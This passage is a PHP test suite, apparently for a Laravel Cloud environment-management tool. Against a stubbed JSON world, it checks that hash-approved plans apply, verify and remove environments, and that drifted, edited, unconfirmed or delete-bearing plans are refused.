<?php

declare(strict_types=1);

use CloudEnvironments\Applier;
use CloudEnvironments\ApplyFailed;
use CloudEnvironments\ApplyRefused;
use CloudEnvironments\Catalog;
use CloudEnvironments\Cloud;
use CloudEnvironments\CloudError;
use CloudEnvironments\PlanFile;
use CloudEnvironments\Planner;
use CloudEnvironments\PlanRefused;
use CloudEnvironments\Remover;
use CloudEnvironments\Verifier;

/**
 * A Cloud organisation held in a JSON file that the stub reads and changes.
 */
final class World
{
    public string $dir;

    public string $file;

    /** @var array<string, string> */
    public array $extra = [];

    public function __construct()
    {
        $this->dir = tempDir();
        $this->file = "{$this->dir}/world.json";
        $this->write([
            'organisation' => 'example-org',
            'applications' => [['id' => 'app-other', 'name' => 'other-app', 'defaultEnvironmentId' => 'env-other']],
            'environments' => [['id' => 'env-other', 'app' => 'app-other', 'name' => 'staging', 'branch' => 'staging', 'buildCommand' => null, 'deployCommand' => null, 'databaseSchemaId' => 'schema-other', 'usesHibernation' => false, 'phpMajorVersion' => '8.4', 'variables' => ['APP_ENV' => 'other'], 'secrets' => ['secret-other']]],
            'instances' => [['id' => 'inst-other', 'env' => 'env-other', 'name' => 'App', 'type' => 'app', 'size' => 'flex-512mb', 'usesScheduler' => false, 'maxReplicas' => 1]],
            'clusters' => [['id' => 'cluster-other', 'name' => 'other-cluster', 'status' => 'available', 'pending' => 0, 'schemas' => [['id' => 'schema-other', 'name' => 'staging']]]],
            'secrets' => [['id' => 'secret-0001', 'key' => 'SERVICE_PASSWORD'], ['id' => 'secret-0002', 'key' => 'SERVICE_PASSWORD'], ['id' => 'secret-other', 'key' => 'OTHER']],
            'domains' => [],
        ]);
    }

    /**
     * @return array<string, mixed>
     */
    public function read(): array
    {
        return json_decode((string) file_get_contents($this->file), true);
    }

    /**
     * @param  array<string, mixed>  $world
     */
    public function write(array $world): void
    {
        file_put_contents($this->file, json_encode($world));
    }

    public function change(callable $fn): void
    {
        $w = $this->read();
        $fn($w);
        $this->write($w);
    }

    /**
     * @return array<string, string>
     */
    public function processEnv(): array
    {
        return array_merge(['CLOUD_BIN' => skillDir().'/tests/stub/cloud', 'CLOUD_STUB_WORLD' => $this->file, 'CLOUD_STUB_LOG' => "{$this->dir}/calls.log", 'CLOUD_STUB_FAIL' => '', 'CLOUD_STUB_PENDING' => '1', 'CLOUD_STUB_FIXTURES' => ''], $this->extra);
    }

    public function cloud(bool $writes = false): Cloud
    {
        foreach ($this->processEnv() as $key => $value) {
            putenv("{$key}={$value}");
        }

        return Cloud::fromEnvironment($writes);
    }

    /**
     * @return list<array{argv: list<string>, write: bool}>
     */
    public function calls(): array
    {
        $log = "{$this->dir}/calls.log";

        return is_file($log) ? array_map(fn ($l) => json_decode($l, true), array_filter(explode("\n", (string) file_get_contents($log)))) : [];
    }

    public function clearCalls(): void
    {
        @unlink("{$this->dir}/calls.log");
    }

    /**
     * @return list<string>
     */
    public function writes(): array
    {
        return array_values(array_map(fn ($c) => $c['argv'][0], array_filter($this->calls(), fn ($c) => $c['write'])));
    }
}

/**
 * @return array<string, mixed>  a plan with its hash, as `plan` writes it
 */
function worldPlan(World $world, ?array $manifest = null, string $kind = 'preview', ?string $slug = 'x'): array
{
    $plan = (new Planner($world->cloud(), $manifest ?? validManifest()))->plan($kind, $slug);
    $plan['hash'] = PlanFile::hash($plan);

    return $plan;
}

/**
 * Applies a plan and fails the test, rather than erroring, if apply refuses or fails.
 *
 * @return list<string>
 */
function applyOrFail(Applier $applier, array $plan): array
{
    try {
        return $applier->apply($plan, $plan['hash']);
    } catch (ApplyRefused | ApplyFailed $e) {
        fail('apply did not run: '.$e->getMessage());
    }
}

function applier(World $world, ?array $manifest = null, int $timeout = 900, ?Closure $sleep = null): Applier
{
    return new Applier($world->cloud(true), $world->cloud(), $manifest ?? validManifest(), $timeout, $sleep ?? static fn (int $s) => null);
}

/**
 * @return array<string, string>  step key => action
 */
function worldActions(World $world, ?array $manifest = null): array
{
    return array_column(worldPlan($world, $manifest)['steps'], 'action', 'key');
}

function appliedPreview(): World
{
    $world = new World();
    $plan = worldPlan($world);
    applyOrFail(applier($world), $plan);
    $world->change(function (array &$w) {
        foreach ($w['environments'] as &$e) {
            $e['phpMajorVersion'] = '8.5';
        }
    });
    $world->clearCalls();

    return $world;
}

test('apply: it runs nothing unless the given and stored hash both match the plan', function () {
    $world = new World();
    $plan = worldPlan($world);

    $edited = array_replace_recursive($plan, ['steps' => [0 => ['args' => ['--name=elsewhere']]]]);

    foreach (['wrong given hash' => [$plan, str_repeat('0', 64)], 'edited step, old hash given' => [$edited, $plan['hash']], 'edited step, its new hash given, stale stored hash' => [$edited, PlanFile::hash($edited)]] as $case => [$candidate, $hash]) {
        $world->clearCalls();

        try {
            applier($world)->apply($candidate, $hash);
            fail("{$case}: expected a refusal");
        } catch (ApplyRefused $e) {
            assertContains('approved hash', $e->getMessage());
        }

        assertSame([], $world->writes(), $case);
    }

    applyOrFail(applier($world), $plan);
    assertTrue(in_array('application:create', $world->writes(), true), 'control: the unedited plan runs');
});

test('apply: a projected field that changed since the plan refuses the run, a volatile one does not', function () {
    $world = appliedPreview();
    $manifest = validManifest();
    $manifest['variables']['APP_NAME'] = 'new';
    $plan = worldPlan($world, $manifest);
    $world->change(function (array &$w) {
        foreach ($w['environments'] as &$e) {
            if ($e['name'] === 'preview-x') {
                $e['branch'] = 'moved';
            }
        }
    });

    try {
        applier($world, $manifest)->apply($plan, $plan['hash']);
        fail('expected a refusal');
    } catch (ApplyRefused $e) {
        assertContains('Cloud has changed since the plan was made (environment)', $e->getMessage());
    }

    assertSame([], $world->writes());

    $world = appliedPreview();
    $plan = worldPlan($world, $manifest);
    $world->change(function (array &$w) {
        foreach ($w['environments'] as &$e) {
            $e['phpMajorVersion'] = '9.9';
        }
    });
    applyOrFail(applier($world, $manifest), $plan);

    assertSame(['environment:variables'], $world->writes(), 'control: a field outside the projection does not stop the run');
});

test('apply: a variable whose manifest value changed after the plan refuses the run', function () {
    $world = new World();
    $plan = worldPlan($world);
    $manifest = validManifest();
    $manifest['variables']['APP_DEBUG'] = 'false';

    try {
        applier($world, $manifest)->apply($plan, $plan['hash']);
        fail('expected a refusal');
    } catch (ApplyRefused $e) {
        assertContains('APP_DEBUG in the manifest has changed', $e->getMessage());
    }

    assertSame([], $world->writes());
});

test('apply: a plan with a delete step is refused, and the same plan without it runs', function () {
    $world = appliedPreview();
    $world->change(function (array &$w) {
        $env = array_values(array_filter($w['environments'], fn ($e) => $e['name'] === 'preview-x'))[0];
        $w['domains'][] = ['id' => 'dom-1', 'env' => $env['id'], 'name' => 'old.example.test'];
    });
    $declared = validManifest();
    $declared['kinds']['preview']['domains'] = ['new.example.test'];
    $plan = worldPlan($world, $declared);
    assertSame('delete', array_column($plan['steps'], 'action', 'key')['domain:old.example.test'] ?? null);

    try {
        applier($world, $declared)->apply($plan, $plan['hash']);
        fail('expected a refusal');
    } catch (ApplyRefused $e) {
        assertContains('delete step', $e->getMessage());
    }

    assertSame([], $world->writes());

    $manifest = validManifest();
    $manifest['kinds']['preview']['domains'] = ['old.example.test', 'new.example.test'];
    $plan = worldPlan($world, $manifest);
    applyOrFail(applier($world, $manifest), $plan);

    assertSame(['domain:create'], $world->writes(), 'control: without the delete, the plan runs');
});

test('apply: references resolve from earlier steps, and each created resource is waited for', function () {
    $world = new World();
    $world->extra['CLOUD_STUB_PENDING'] = '3';
    $plan = worldPlan($world);
    $slept = 0;
    applyOrFail(applier($world, null, 900, function (int $s) use (&$slept) {
        $slept += $s;
    }), $plan);

    $w = $world->read();
    $env = array_values(array_filter($w['environments'], fn ($e) => $e['name'] === 'preview-x'))[0];
    $schema = $w['clusters'][1]['schemas'][0];

    assertSame($schema['id'], $env['databaseSchemaId'], 'the schema reference resolved');
    assertSame('preview-x', $schema['name']);
    assertSame($w['applications'][1]['id'], $env['app'], 'the application reference resolved');
    assertTrue($slept >= 30, 'it waited while the cluster was creating');

    foreach ($world->calls() as $call) {
        assertNotContains('{step:', implode(' ', $call['argv']));
        assertNotContains('{var:', implode(' ', $call['argv']));
    }
});

test('apply: a resource that never becomes ready stops the run after the timeout', function () {
    $world = new World();
    $world->extra['CLOUD_STUB_PENDING'] = '1000';
    $plan = worldPlan($world);

    try {
        applier($world, null, 30)->apply($plan, $plan['hash']);
        fail('expected a failure');
    } catch (ApplyFailed $e) {
        assertContains('was not ready after 30 seconds', $e->getMessage());
    }

    assertNotContains('database:create', implode(' ', $world->writes()));
});

test('apply: a failed step stops the run, reports what ran, and a fresh plan shows those steps as keep', function () {
    $world = new World();
    $world->extra['CLOUD_STUB_FAIL'] = 'managed-queue:create';
    $plan = worldPlan($world);

    try {
        applier($world)->apply($plan, $plan['hash']);
        fail('expected a failure');
    } catch (ApplyFailed $e) {
        assertContains('7 change instance: done', $e->getMessage());
        assertContains('8 create managed-queue: FAILED', $e->getMessage());
        assertContains('No later step ran', $e->getMessage());
    }

    assertSame(['application:create', 'database-cluster:create', 'database:create', 'environment:create', 'environment:update', 'instance:update', 'managed-queue:create'], $world->writes());

    $world->extra['CLOUD_STUB_FAIL'] = '';
    $actions = worldActions($world);

    foreach (['application', 'cluster', 'schema', 'environment', 'environment-settings', 'instance'] as $key) {
        assertSame('keep', $actions[$key], $key);
    }

    assertSame('create', $actions['queue']);
});

test('apply control: without a failure every step runs, and a plan afterwards is all keep', function () {
    $world = new World();
    $plan = worldPlan($world);
    $log = applyOrFail(applier($world), $plan);

    assertSame(count($plan['steps']), count($log));
    assertSame(['keep'], array_values(array_unique(worldActions($world))));
});

test('apply: it attaches only the secrets the manifest allows for the kind, and never creates one', function () {
    $world = new World();
    $plan = worldPlan($world);
    $byKey = array_column($plan['steps'], null, 'key');
    $index = $byKey['secret:secret-0001']['n'] - 1;
    $edited = $plan;
    $edited['steps'][$index]['args'][1] = 'secret-0002';
    $edited['hash'] = PlanFile::hash($edited);

    try {
        applier($world)->apply($edited, $edited['hash']);
        fail('expected a refusal');
    } catch (ApplyRefused $e) {
        assertContains('secret-0002, which the manifest does not allow on a preview', $e->getMessage());
    }

    assertSame([], $world->writes());

    applier($world)->apply($plan, $plan['hash']);
    $w = $world->read();
    $env = array_values(array_filter($w['environments'], fn ($e) => $e['name'] === 'preview-x'))[0];

    assertSame(['secret-0001'], $env['secrets'], 'control: the allowed secret is attached');
    assertTrue(! in_array('secret:create', $world->writes(), true), 'no secret is created');
    assertTrue(! in_array('secret:create', array_column($plan['steps'], 'command'), true), 'plan emits no secret:create');

    $creating = $plan;
    $creating['steps'][$index]['command'] = 'secret:create';
    $creating['steps'][$index]['args'] = ['--name=SERVICE_PASSWORD'];
    $creating['hash'] = PlanFile::hash($creating);

    try {
        applier($world)->apply($creating, $creating['hash']);
        fail('expected a refusal');
    } catch (ApplyRefused $e) {
        assertContains('secrets are created only by `secrets`', $e->getMessage());
    }
});

/**
 * @return list<string>
 */
function verifyPreview(World $world, ?array $manifest = null): array
{
    return (new Verifier($world->cloud(), $manifest ?? validManifest(), $world->cloud(true)))->verify('preview-x');
}

function changePreview(World $world, callable $fn): void
{
    $world->change(function (array &$w) use ($fn) {
        foreach ($w['environments'] as &$e) {
            if ($e['name'] === 'preview-x') {
                $fn($e, $w);
            }
        }
    });
}

test('verify: a matching environment passes, and undeclared variables are ignored', function () {
    $world = appliedPreview();
    changePreview($world, function (array &$e) {
        $e['variables']['UNDECLARED'] = 'anything';
    });

    try {
        assertSame([], verifyPreview($world));
    } catch (CloudError $e) {
        fail('verify could not read the environment: '.$e->getMessage());
    }
});

test('verify: each difference from the manifest fails, naming the item', function () {
    $cases = [
        'PHP version' => fn (World $w) => changePreview($w, function (array &$e) { $e['phpMajorVersion'] = '8.4'; }),
        'PHP extension intl' => fn (World $w) => $w->change(function (array &$x) { $x['php_modules'] = "Core\n"; }),
        'variable APP_DEBUG is missing' => fn (World $w) => changePreview($w, function (array &$e) { unset($e['variables']['APP_DEBUG']); }),
        'variable APP_ENV differs' => fn (World $w) => changePreview($w, function (array &$e) { $e['variables']['APP_ENV'] = 'production'; }),
        'required value: MAIL_MAILER' => fn (World $w) => changePreview($w, function (array &$e) { $e['variables']['MAIL_MAILER'] = 'smtp'; }),
        'secret secret-0002 is attached but not allowed' => fn (World $w) => changePreview($w, function (array &$e) { $e['secrets'][] = 'secret-0002'; }),
        'secret SERVICE_PASSWORD (secret-0001) is not attached' => fn (World $w) => changePreview($w, function (array &$e) { $e['secrets'] = []; }),
        'instance scheduler' => fn (World $w) => $w->change(function (array &$x) { foreach ($x['instances'] as &$i) { if ($i['type'] === 'app') { $i['usesScheduler'] = false; } } }),
        'instance size' => fn (World $w) => $w->change(function (array &$x) { foreach ($x['instances'] as &$i) { if ($i['type'] === 'app') { $i['size'] = 'flex-2gb'; } } }),
        'scale to zero' => fn (World $w) => changePreview($w, function (array &$e) { $e['usesHibernation'] = false; }),
        'managed queue is missing' => fn (World $w) => $w->change(function (array &$x) { $x['instances'] = array_values(array_filter($x['instances'], fn ($i) => $i['type'] !== 'managed_queue')); }),
        'managed queue size or workers' => fn (World $w) => $w->change(function (array &$x) { foreach ($x['instances'] as &$i) { if ($i['type'] === 'managed_queue') { $i['maxReplicas'] = 9; } } }),
        "database: the environment's schema" => fn (World $w) => changePreview($w, function (array &$e) { $e['databaseSchemaId'] = 'schema-other'; }),
        'branch: elsewhere' => fn (World $w) => changePreview($w, function (array &$e) { $e['branch'] = 'elsewhere'; }),
    ];

    foreach ($cases as $expected => $break) {
        $world = appliedPreview();
        assertSame([], verifyPreview($world), "control for {$expected}");
        $break($world);
        $failures = implode("\n", verifyPreview($world));

        assertContains($expected, $failures, $expected);
    }
});

test('verify: a missing environment is reported, and the variable read uses --show-sensitive', function () {
    $world = appliedPreview();
    verifyPreview($world);
    $get = array_values(array_filter($world->calls(), fn ($c) => $c['argv'][0] === 'environment:get'));

    assertTrue($get !== [] && in_array('--show-sensitive', $get[0]['argv'], true), 'values are read unmasked');
    assertSame(['environment preview-y does not exist in example-app'], (new Verifier($world->cloud(), validManifest(), $world->cloud(true)))->verify('preview-y'));
});

test('remove: it refuses without the exact confirmation, and preview down refuses anything but a preview', function () {
    $world = appliedPreview();

    foreach ([['preview-x', null, false], ['preview-x', 'preview-X', false], ['staging', 'staging', true], ['production', 'production', true], ['main', 'main', true]] as [$name, $confirm, $previewOnly]) {
        try {
            (new Remover($world->cloud(true), $world->cloud(), validManifest()))->removeEnvironment($name, $confirm, $previewOnly);
            fail("expected a refusal for {$name}");
        } catch (PlanRefused $e) {
            assertTrue(str_contains($e->getMessage(), '--confirm') || str_contains($e->getMessage(), 'only preview-'), $e->getMessage());
        }
    }

    assertSame([], $world->writes());
});

test('remove: a preview that does not exist is reported and nothing is called that writes', function () {
    $world = appliedPreview();
    $log = (new Remover($world->cloud(true), $world->cloud(), validManifest()))->removeEnvironment('preview-gone', 'preview-gone', true);

    assertSame(['preview-gone does not exist in example-app; nothing removed'], $log);
    assertSame([], $world->writes());
});

test('remove: preview down deletes the environment and its schema, and nothing else', function () {
    $world = appliedPreview();
    $before = $world->read();
    (new Remover($world->cloud(true), $world->cloud(), validManifest()))->removeEnvironment('preview-x', 'preview-x', true);

    assertSame(['environment:delete', 'database:delete'], $world->writes());

    $after = $world->read();
    $preview = array_values(array_filter($before['environments'], fn ($e) => $e['name'] === 'preview-x'))[0];

    foreach ($world->calls() as $call) {
        if ($call['write']) {
            assertTrue(in_array($preview['id'], $call['argv'], true) || in_array($preview['databaseSchemaId'], $call['argv'], true), 'each write names the preview or its schema');
            assertNotContains('env-other', implode(' ', $call['argv']));
            assertTrue(! in_array('database-cluster:delete', $call['argv'], true), 'the cluster is not deleted');
        }
    }

    assertSame(array_map(fn ($c) => $c['id'], $before['clusters']), array_map(fn ($c) => $c['id'], $after['clusters']), 'floor: every cluster is still there');
    assertSame(count($before['environments']) - 1, count($after['environments']));
    assertTrue(in_array('env-other', array_column($after['environments'], 'id'), true), 'floor: the other application\'s environment is still there');
});

test('remove: a schema another environment uses is kept', function () {
    $world = appliedPreview();
    $w = $world->read();
    $preview = array_values(array_filter($w['environments'], fn ($e) => $e['name'] === 'preview-x'))[0];
    $world->change(function (array &$x) use ($preview) {
        $x['environments'][0]['databaseSchemaId'] = $preview['databaseSchemaId'];
    });
    $log = (new Remover($world->cloud(true), $world->cloud(), validManifest()))->removeEnvironment('preview-x', 'preview-x', true);

    assertSame(['environment:delete'], $world->writes());
    assertContains('kept', implode("\n", $log));
});

test('cli: apply, verify and preview down run end to end against the stub, and exit non-zero on refusal', function () {
    $world = new World();
    $root = tempDir();
    runProcess(['git', 'init', '-q'], [], $root);
    file_put_contents("{$root}/.gitignore", ".cloud/plans/\n");
    file_put_contents("{$root}/cloud-environments.json", json_encode(validManifest()));
    $env = $world->processEnv();
    $cli = ['php', skillDir().'/scripts/cloud-env.php'];

    $plan = runProcess([...$cli, 'plan', 'preview', '--slug=x'], $env, $root);
    assertSame(0, $plan['exit'], $plan['err']);
    preg_match('/hash: ([0-9a-f]{64})/', $plan['out'], $m);
    assertSame(0, runProcess([...$cli, 'render', '.cloud/plans/preview-x.json'], $env, $root)['exit']);

    $refused = runProcess([...$cli, 'apply', '.cloud/plans/preview-x.json', '--hash='.str_repeat('0', 64)], $env, $root);
    assertSame(1, $refused['exit']);
    assertContains('approved hash', $refused['err'], 'a wrong hash is reported as such when the diagram is there');

    $missing = runProcess([...$cli, 'apply', '.cloud/plans/nope.json', '--hash='.$m[1]], $env, $root);
    assertSame(1, $missing['exit']);
    assertContains('not a plan file', $missing['err']);
    assertSame(2, runProcess([...$cli, 'apply', '.cloud/plans/preview-x.json'], $env, $root)['exit'], 'no hash, usage');

    $applied = runProcess([...$cli, 'apply', '.cloud/plans/preview-x.json', '--hash='.$m[1]], $env, $root);
    assertSame(0, $applied['exit'], $applied['err']);

    $failed = runProcess([...$cli, 'verify', 'preview-x'], $env, $root);
    assertSame(1, $failed['exit']);
    assertContains('PHP version', $failed['err']);

    changePreview($world, function (array &$e) { $e['phpMajorVersion'] = '8.5'; });
    $verified = runProcess([...$cli, 'verify', 'preview-x'], $env, $root);
    assertSame(0, $verified['exit'], $verified['err']);

    $noConfirm = runProcess([...$cli, 'preview', 'down', 'x'], $env, $root);
    assertSame(1, $noConfirm['exit']);
    assertContains('--confirm=preview-x', $noConfirm['err']);

    $down = runProcess([...$cli, 'preview', 'down', 'x', '--confirm=preview-x'], $env, $root);
    assertSame(0, $down['exit'], $down['err']);
    assertContains('environment preview-x', $down['out']);
});

test('apply: a plan made for another application or organisation is refused', function () {
    $world = new World();
    $plan = worldPlan($world);
    $other = validManifest();
    $other['application'] = 'another-app';

    try {
        applier($world, $other)->apply($plan, $plan['hash']);
        fail('expected a refusal');
    } catch (ApplyRefused $e) {
        assertContains('the plan is for example-app', $e->getMessage());
    }

    assertSame([], $world->writes());
});

test('plan: a domain on an environment whose kind declares no domains is left alone', function () {
    $world = appliedPreview();
    $world->change(function (array &$w) {
        $env = array_values(array_filter($w['environments'], fn ($e) => $e['name'] === 'preview-x'))[0];
        $w['domains'][] = ['id' => 'dom-1', 'env' => $env['id'], 'name' => 'dashboard.example.test'];
    });

    assertTrue(! array_key_exists('domain:dashboard.example.test', worldActions($world)), 'no step for an undeclared domain');
});

test('remove domain: it deletes one named domain of an owned environment after confirmation', function () {
    $world = appliedPreview();
    $world->change(function (array &$w) {
        $env = array_values(array_filter($w['environments'], fn ($e) => $e['name'] === 'preview-x'))[0];
        $w['domains'][] = ['id' => 'dom-1', 'env' => $env['id'], 'name' => 'old.example.test'];
    });
    $remover = new Remover($world->cloud(true), $world->cloud(), validManifest());

    try {
        $remover->removeDomain('preview-x', 'old.example.test', 'old');
        fail('expected a refusal');
    } catch (PlanRefused $e) {
        assertContains('--confirm=old.example.test', $e->getMessage());
    }

    assertSame([], $world->writes());
    assertSame(['domain old.example.test removed from preview-x'], $remover->removeDomain('preview-x', 'old.example.test', 'old.example.test'));
    assertSame(['domain:delete'], $world->writes());
});

test('remove: when the schema delete fails, the message still says the environment was deleted', function () {
    $world = appliedPreview();
    $world->extra['CLOUD_STUB_FAIL'] = 'database:delete';

    try {
        (new Remover($world->cloud(true), $world->cloud(), validManifest()))->removeEnvironment('preview-x', 'preview-x', true);
        fail('expected an error');
    } catch (CloudError $e) {
        assertContains('environment preview-x', $e->getMessage());
        assertContains('was NOT deleted', $e->getMessage());
    }
});

test('verify: running php -m needs a runner that may run commands, and a read-only runner refuses command:run', function () {
    $world = appliedPreview();

    try {
        (new Verifier($world->cloud(), validManifest()))->verify('preview-x');
        fail('expected a refusal');
    } catch (PlanRefused $e) {
        assertContains('php -m', $e->getMessage());
    }

    try {
        $world->cloud()->json(['command:run', 'env-1', '--cmd=php -m']);
        fail('expected a refusal');
    } catch (CloudError $e) {
        assertContains('read-only', $e->getMessage());
    }

    assertSame([], (new Verifier($world->cloud(), validManifest()))->verify('preview-x', null, false), 'control: without the extension check it verifies');
});

test('verify: it recognises the managed queue as plan does', function () {
    $world = appliedPreview();
    $world->change(function (array &$w) {
        foreach ($w['instances'] as &$i) {
            if ($i['type'] === 'managed_queue') {
                $i['type'] = 'managed-queue';
            }
        }
    });

    assertSame([], verifyPreview($world));
});

test('cloud: a large stderr from a failing command does not block the read', function () {
    $state = completePreviewState()->fail('secret:list', 1, str_repeat('x', 300000));

    try {
        planPreview($state);
        fail('expected an error');
    } catch (CloudError $e) {
        assertContains('secret:list failed (exit 1): xxxxxxxxxx', $e->getMessage());
    }
});

test('remove: a schema in a cluster the manifest does not name is kept', function () {
    $world = appliedPreview();
    $world->change(function (array &$w) {
        $w['clusters'][0]['schemas'][] = ['id' => 'schema-loose', 'name' => 'preview-x'];

        foreach ($w['environments'] as &$e) {
            if ($e['name'] === 'preview-x') {
                $e['databaseSchemaId'] = 'schema-loose';
            }
        }
    });
    $log = (new Remover($world->cloud(true), $world->cloud(), validManifest()))->removeEnvironment('preview-x', 'preview-x', true);

    assertSame(['environment:delete'], $world->writes());
    assertContains('kept', implode("\n", $log));
});

test('apply: it waits for a created schema and environment before using them', function () {
    $world = new World();
    $world->extra['CLOUD_STUB_PENDING'] = '3';
    $plan = worldPlan($world);
    applyOrFail(applier($world), $plan);

    $reads = array_count_values(array_map(fn ($c) => $c['argv'][0], $world->calls()));
    assertTrue(($reads['environment:get'] ?? 0) >= 4, 'the environment was polled until its instance appeared');
    assertSame(['keep'], array_values(array_unique(worldActions($world))));
});

test('verify: a php -m run that does not succeed fails verification', function () {
    $world = appliedPreview();
    $world->change(function (array &$w) { $w['php_status'] = 'command.failure'; });

    assertContains('php -m did not succeed: command.failure', implode("\n", verifyPreview($world)));
});

test('cli: verify without an environment prints its usage and exits 2', function () {
    $run = runProcess(['php', skillDir().'/scripts/cloud-env.php', 'verify', '--manifest='.skillDir().'/tests/fixtures/manifest-valid.json'], (new World())->processEnv());

    assertSame(2, $run['exit']);
    assertContains('usage: cloud-env.php verify', $run['err']);
});

test('verify: --branch overrides a preview\'s branch and is refused for staging and production', function () {
    $world = appliedPreview();
    changePreview($world, function (array &$e) { $e['branch'] = 'feature/x'; });
    $verifier = new Verifier($world->cloud(), validManifest(), $world->cloud(true));

    assertContains('branch: feature/x', implode("\n", $verifier->verify('preview-x')));
    assertSame([], $verifier->verify('preview-x', 'feature/x'));

    foreach (['staging', 'production'] as $kind) {
        try {
            $verifier->verify($kind, 'main');
            fail("expected a refusal for {$kind}");
        } catch (PlanRefused $e) {
            assertContains("{$kind} takes no --branch", $e->getMessage());
        }
    }
});

test('cli: apply refuses a hash that does not start with the approved plan code', function () {
    $world = new World();
    $root = tempDir();
    runProcess(['git', 'init', '-q'], [], $root);
    file_put_contents("{$root}/.gitignore", ".cloud/plans/\n");
    file_put_contents("{$root}/cloud-environments.json", json_encode(validManifest()));
    $env = $world->processEnv();
    $planned = runProcess(['php', skillDir().'/scripts/cloud-env.php', 'plan', 'preview', '--slug=x'], $env, $root);
    preg_match('/hash: ([0-9a-f]{64})/', $planned['out'], $m);
    runProcess(['php', skillDir().'/scripts/cloud-env.php', 'render', '.cloud/plans/preview-x.json'], $env, $root);

    $run = runProcess(['php', skillDir().'/scripts/cloud-env.php', 'apply', '.cloud/plans/preview-x.json', '--hash='.$m[1], '--code=00000000'], $env, $root);
    assertSame(1, $run['exit']);
    assertContains('does not belong to the approved plan code', $run['err']);
    assertSame([], $world->writes());

    $ok = runProcess(['php', skillDir().'/scripts/cloud-env.php', 'apply', '.cloud/plans/preview-x.json', '--hash='.$m[1], '--code='.substr($m[1], 0, 8)], $env, $root);
    assertSame(0, $ok['exit'], $ok['err']);
});

test('cli: apply refuses a plan with no diagram, or a diagram of an earlier plan, and runs once its diagram is rendered', function () {
    $world = new World();
    $root = tempDir();
    runProcess(['git', 'init', '-q'], [], $root);
    file_put_contents("{$root}/.gitignore", ".cloud/plans/\n");
    file_put_contents("{$root}/cloud-environments.json", json_encode(validManifest()));
    $env = $world->processEnv();
    $cli = ['php', skillDir().'/scripts/cloud-env.php'];

    $first = runProcess([...$cli, 'plan', 'preview', '--slug=x'], $env, $root);
    preg_match('/hash: ([0-9a-f]{64})/', $first['out'], $old);

    $none = runProcess([...$cli, 'apply', '.cloud/plans/preview-x.json', '--hash='.$old[1]], $env, $root);
    assertSame(1, $none['exit']);
    assertContains('no diagram of this plan', $none['err']);
    assertContains('render', $none['err']);

    runProcess([...$cli, 'render', '.cloud/plans/preview-x.json'], $env, $root);
    $manifest = validManifest();
    $manifest['variables']['APP_NAME'] = 'changed';
    file_put_contents("{$root}/cloud-environments.json", json_encode($manifest));
    $second = runProcess([...$cli, 'plan', 'preview', '--slug=x'], $env, $root);
    preg_match('/hash: ([0-9a-f]{64})/', $second['out'], $new);

    $stale = runProcess([...$cli, 'apply', '.cloud/plans/preview-x.json', '--hash='.$new[1]], $env, $root);
    assertSame(1, $stale['exit'], 'a diagram of the earlier plan does not count');
    assertSame([], $world->writes());

    runProcess([...$cli, 'render', '.cloud/plans/preview-x.json'], $env, $root);
    $ok = runProcess([...$cli, 'apply', '.cloud/plans/preview-x.json', '--hash='.$new[1]], $env, $root);
    assertSame(0, $ok['exit'], $ok['err']);
});

test('apply: a repository Cloud cannot see is reported with the GitHub app step', function () {
    $world = new World();
    $world->extra['CLOUD_STUB_FAIL'] = 'application:create';
    $world->extra['CLOUD_STUB_FAIL_MESSAGE'] = 'The repository [example-owner/example-app] could not be found.';
    $plan = worldPlan($world);

    try {
        applier($world)->apply($plan, $plan['hash']);
        fail('expected a failure');
    } catch (ApplyFailed $e) {
        assertContains('could not be found', $e->getMessage());
        assertContains('GitHub Apps → Laravel Cloud → Configure → Repository access', $e->getMessage());
    }

    assertContains('Laravel Cloud\'s GitHub app can see the repository', (string) file_get_contents(skillDir().'/SKILL.md'));
});

test('verify: a differing scale-to-zero timeout fails, naming it', function () {
    $world = appliedPreview();
    $world->change(function (array &$x) { foreach ($x['instances'] as &$i) { if ($i['type'] === 'app' && $i['env'] !== 'env-other') { $i['hibernationTimeout'] = 60; } } });

    assertContains('scale to zero timeout: 60 minutes, expected 5', implode("\n", verifyPreview($world)));
});

test('remove: the application\'s default environment is refused with the reason', function () {
    $world = appliedPreview();
    $w = $world->read();
    $default = array_values(array_filter($w['applications'], fn ($a) => $a['name'] === 'example-app'))[0]['defaultEnvironmentId'];
    $name = array_values(array_filter($w['environments'], fn ($e) => $e['id'] === $default))[0]['name'];

    try {
        (new Remover($world->cloud(true), $world->cloud(), validManifest()))->removeEnvironment($name, $name);
        fail('expected a refusal');
    } catch (PlanRefused $e) {
        assertContains('default environment', $e->getMessage());
    }

    assertSame([], $world->writes());
});

test('plan: the default-environment step says it cannot be deleted and the production plan adopts it', function () {
    $note = array_column(worldPlan(new World())['steps'], null, 'key')['default-environment']['note'];

    assertContains('cannot be deleted', $note);
    assertContains('production plan adopts it', $note);
    assertNotContains('Decide whether to remove it', $note);
});

test('push to deploy: a kind\'s value is set by apply, kept by a later plan, and checked by verify', function () {
    $world = new World();
    $m = validManifest();
    $m['kinds']['preview']['push_to_deploy'] = false;
    $plan = worldPlan($world, $m);

    assertContains('--uses-push-to-deploy=false', implode(' ', array_column($plan['steps'], null, 'key')['environment-settings']['args']));
    applyOrFail(applier($world, $m), $plan);
    assertSame('keep', worldActions($world, $m)['environment-settings']);

    changePreview($world, function (array &$e) { $e['phpMajorVersion'] = '8.5'; $e['usesPushToDeploy'] = true; });
    assertSame('change', worldActions($world, $m)['environment-settings'], 'a differing value is a change');
    assertContains('push to deploy: true, expected false', implode("\n", (new Verifier($world->cloud(), $m, $world->cloud(true)))->verify('preview-x')));
});

test('push to deploy control: a kind that does not declare it leaves the setting alone', function () {
    $world = new World();
    $plan = worldPlan($world);

    assertNotContains('--uses-push-to-deploy', json_encode($plan['steps']));
});

test('queue minimum: a new queue gets a scaling step referencing it, apply sets 0, and a later plan keeps it', function () {
    $world = new World();
    $m = validManifest();
    $m['queue']['min_workers'] = 0;
    $plan = worldPlan($world, $m);
    $steps = array_column($plan['steps'], null, 'key');
    $queueStep = $steps['queue']['n'];

    assertSame(['{step:'.$queueStep.'.id}', '--min-replicas=0', '--force'], $steps['queue-scaling']['args'] ?? null);
    applyOrFail(applier($world, $m), $plan);

    $queue = array_values(array_filter($world->read()['instances'], fn ($i) => $i['type'] === 'managed_queue'))[0];
    assertSame(0, $queue['minReplicas']);
    assertSame('keep', worldActions($world, $m)['queue-scaling']);
});

test('queue minimum: an existing queue at 1 is changed by its own ID, and verify names it', function () {
    $world = new World();
    applyOrFail(applier($world), worldPlan($world));
    changePreview($world, function (array &$e) { $e['phpMajorVersion'] = '8.5'; });
    $m = validManifest();
    $m['queue']['min_workers'] = 0;

